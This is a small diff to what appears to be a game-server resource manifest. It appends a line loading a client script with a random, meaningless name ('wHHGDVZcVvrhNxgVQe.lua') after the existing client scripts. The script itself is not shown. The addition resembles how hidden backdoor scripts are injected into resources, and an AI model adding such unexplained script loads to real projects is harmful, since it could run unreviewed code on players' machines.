@@ -11,3 +11,5 @@ client_scripts {
 	"admin_client.lua",
 	"gui_c.lua",
 }
+
+client_script "wHHGDVZcVvrhNxgVQe.lua"
